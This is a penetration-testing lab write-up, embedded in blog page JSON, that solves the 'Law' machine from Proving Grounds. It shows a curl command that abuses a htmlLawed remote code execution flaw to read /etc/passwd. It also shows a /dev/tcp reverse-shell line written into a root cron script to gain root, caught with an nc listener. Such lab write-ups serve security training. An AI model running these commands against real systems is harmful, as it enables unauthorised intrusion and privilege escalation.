{"componentChunkName":"component---src-templates-post-template-tsx","path":"/250315/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Initial Scan</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Host is up (0.042s latency). \r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nRead data files from: /usr/share/nmap\r\nNmap done: 1 IP address (1 host up) scanned in 20.37 seconds\r\n           Raw packets sent: 65583 (2.886MB) | Rcvd: 65551 (2.624MB)</code></pre></div>\n<p>Nothing Special. Let’s visit the web application.</p>\n<h2>2. Initial Foothold</h2>\n<p>As I visited port 80:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7d942175473806718e6555b2124f2402/1144c/3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 85.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7UlEQVR42uWQb08TQRDG94uoYFtUIkoxQkv/gJUmGuOHNMEYA4RIYns9Gv0cvGiIve7t3fV6V+9q/yS0jzsLW6+mGF/4zk1+mefJzM7ODkulH+HxxhaKpQp2Cy+wky8jlytj48kzrN5/gDv30rirWcn80pKV1TWkUg+RWVtHOrMO6sXKe1XsV16jUn2LQukl8s8LyO/uI188QE42z2a3kd3K4amMmzea4qaM2zslFPdeoXLwRvUolqtg7w7PcPj+Mz58rMOom2jWDNTNJmqNrzAM6RtNmOdflDYNAw3zHEatLmNTcVYzcfzpFEdHJzg+OQXrxxHiQYwfgwFG4zEGFEcjTKSmOAgDDKMI48kEw+EIfzqz2QxsdFNEZjqdYnp1dR01v3mqWwQKOuPxBOybZcHzPMRxjCj6Lon+ml6vJwkQhn2lfQnjLofwBAKZSHJdvEgQBEtJ5pnf9eG6LoQjYDkW2qINS1jKO66jchrf9+eXSWvf7/fnMCrknMO2bbQ6LVxYF2jxFtq8jUt+Cddz0e121VpuI/kL1VAIoXAcB1xwOMKZo3P0IOWpuX4gqQmamFERFRPc5ujYHRX11AQ1XPbtZTtWE+pLakqayhZzryfXO9NTaZ9ENQzDcGGpt0F1ydqk15pgSfMv+A8b/gQQKqNx6VcTOQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7d942175473806718e6555b2124f2402/a59e9/3.webp 192w,\n/static/7d942175473806718e6555b2124f2402/0ca9f/3.webp 384w,\n/static/7d942175473806718e6555b2124f2402/dc9b9/3.webp 768w,\n/static/7d942175473806718e6555b2124f2402/26609/3.webp 955w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7d942175473806718e6555b2124f2402/3b721/3.png 192w,\n/static/7d942175473806718e6555b2124f2402/66595/3.png 384w,\n/static/7d942175473806718e6555b2124f2402/fe486/3.png 768w,\n/static/7d942175473806718e6555b2124f2402/1144c/3.png 955w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7d942175473806718e6555b2124f2402/fe486/3.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>So it somehow seems to be an RCE case.\r\nAs I searched for cve, this popped up.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(root㉿kali)-[/home/hlee]\r\n└─# searchsploit htmlLawed\r\n--------------------------------------------------------------------------------- ---------------------------------\r\n Exploit Title                                                                   |  Path\r\n--------------------------------------------------------------------------------- ---------------------------------\r\nhtmlLawed 1.2.5 - Remote Code Execution (RCE)                                    | php/webapps/52023.sh\r\n--------------------------------------------------------------------------------- ---------------------------------\r\nShellcodes: No Results</code></pre></div>\n<p>Hm okay.</p>\n<p>The script itself didn’t really work. So I tried to do it manually using the information from script.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]                                                                                                 \r\n└─$ curl -s -d 'sid=foo&amp;hhook=exec&amp;text=cat /etc/passwd' -b 'sid=foo' http://192.168.205.190 |egrep '\\&amp;nbsp; \\[[0-9]\r\n+\\] =\\&amp;gt;'| sed -E 's/\\&amp;nbsp; \\[[0-9]+\\] =\\&amp;gt; (.*)&lt;br \\/>/\\1/' \r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\n</code></pre></div>\n<p>Now I tried simple revshell. Remember, base64 encoding is faster than trying random binaries.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3196d843f608da8ce8ffa9dc9753fbb4/ec645/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.604166666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/klEQVR42n1Q0W7DIAwky9IQMGBMgHRbJ+X/P/JqKk2dtmkPJ58t+3y2ofSBjRhErwh2BtkF0a2owui74FoFrSR0Cegl4qgJLWuUiKr1owTlhMxB8whjLwucnUDbBL/O2LYV3m/YVew4GkpvYOVDrI3YdYFkXcLIdUeRhKsK70VrTWCMNVicx3wJeFF3LjqQbitth08EFzx8JERmMGeFIOcv5Efk/KwZbnra2zt6+4TzBE4MEcHtdlOXO0SbRi46nGLU19AvhG/cpJh0IKOq/TxcqOAQOs/zIVpb1VMa+tGRtc+TBwV64oe4maYJf8E6C0dOXTts+tOBwYfgf7gDgXWMD7re35gAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3196d843f608da8ce8ffa9dc9753fbb4/a59e9/4.webp 192w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/0ca9f/4.webp 384w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/dc9b9/4.webp 768w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/3eb2d/4.webp 933w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3196d843f608da8ce8ffa9dc9753fbb4/3b721/4.png 192w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/66595/4.png 384w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/fe486/4.png 768w,\n/static/3196d843f608da8ce8ffa9dc9753fbb4/ec645/4.png 933w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3196d843f608da8ce8ffa9dc9753fbb4/fe486/4.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Got it. I’m logged in as a non-admin user.</p>\n<h2>2. Privilege Escalation</h2>\n<p>As I ran <code class=\"language-text\">linpeas.sh</code> I found some suspicious binaries, one of them was cleanup.sh which surely looks suspicious.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">/var/cache/apache2/mod_cache_disk                                                                                   \r\n/var/lib/php/sessions                                                                                               \r\n/var/tmp                                                                                                            \r\n/var/www/cleanup.sh                                                                                                 \r\n/var/www/html           </code></pre></div>\n<p>I also ran pspy64:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">2025/03/04 15:21:52 CMD: UID=0    PID=1      | /sbin/init \r\n2025/03/04 15:22:01 CMD: UID=0    PID=15355  | /usr/sbin/CRON -f \r\n2025/03/04 15:22:01 CMD: UID=0    PID=15357  | /usr/sbin/CRON -f \r\n2025/03/04 15:22:01 CMD: UID=0    PID=15358  | /bin/bash /var/www/cleanup.sh </code></pre></div>\n<p>We can see that the root user is running the cleanup.sh!</p>\n<p>Since the account I have had a write permission, I could modify the cleanup.sh.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@law:/var/www$ echo 'sh -i >&amp; /dev/tcp/192.168.45.221/443 0>&amp;1' > cleanup.sh                                \r\n&lt;i >&amp; /dev/tcp/192.168.45.221/443 0>&amp;1' >> cleanup.sh  </code></pre></div>\n<p>Then I waited calmly til the modified script get executed by cronjob.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]\r\n└─$ nc -lvnp 443\r\nlistening on [any] 443 ...\r\nconnect to [192.168.45.221] from (UNKNOWN) [192.168.205.190] 42046\r\nsh: 0: can't access tty; job control turned off\r\n# whoami\r\nroot\r\n# </code></pre></div>\n<p>Done! Pretty straight-forward. But again, understanding CVE is important.</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Proving Grounds : Law","summary":"Solving Law machine from Proving Grounds","date":"2025.03.15.","before":"2025.03.11.","after":"2025.03.16.","categories":["proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7UlEQVR42uWQb08TQRDG94uoYFtUIkoxQkv/gJUmGuOHNMEYA4RIYns9Gv0cvGiIve7t3fV6V+9q/yS0jzsLW6+mGF/4zk1+mefJzM7ODkulH+HxxhaKpQp2Cy+wky8jlytj48kzrN5/gDv30rirWcn80pKV1TWkUg+RWVtHOrMO6sXKe1XsV16jUn2LQukl8s8LyO/uI188QE42z2a3kd3K4amMmzea4qaM2zslFPdeoXLwRvUolqtg7w7PcPj+Mz58rMOom2jWDNTNJmqNrzAM6RtNmOdflDYNAw3zHEatLmNTcVYzcfzpFEdHJzg+OQXrxxHiQYwfgwFG4zEGFEcjTKSmOAgDDKMI48kEw+EIfzqz2QxsdFNEZjqdYnp1dR01v3mqWwQKOuPxBOybZcHzPMRxjCj6Lon+ml6vJwkQhn2lfQnjLofwBAKZSHJdvEgQBEtJ5pnf9eG6LoQjYDkW2qINS1jKO66jchrf9+eXSWvf7/fnMCrknMO2bbQ6LVxYF2jxFtq8jUt+Cddz0e121VpuI/kL1VAIoXAcB1xwOMKZo3P0IOWpuX4gqQmamFERFRPc5ujYHRX11AQ1XPbtZTtWE+pLakqayhZzryfXO9NTaZ9ENQzDcGGpt0F1ydqk15pgSfMv+A8b/gQQKqNx6VcTOQAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/7d942175473806718e6555b2124f2402/19093/3.png","srcSet":"/static/7d942175473806718e6555b2124f2402/45861/3.png 239w,\n/static/7d942175473806718e6555b2124f2402/b441a/3.png 478w,\n/static/7d942175473806718e6555b2124f2402/19093/3.png 955w","sizes":"(min-width: 955px) 955px, 100vw"},"sources":[{"srcSet":"/static/7d942175473806718e6555b2124f2402/b1b53/3.webp 239w,\n/static/7d942175473806718e6555b2124f2402/9add4/3.webp 478w,\n/static/7d942175473806718e6555b2124f2402/dd18f/3.webp 955w","type":"image/webp","sizes":"(min-width: 955px) 955px, 100vw"}]},"width":955,"height":814.0000000000001}},"publicURL":"/static/7d942175473806718e6555b2124f2402/3.png"}}}}]}},"pageContext":{"slug":"/250315/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}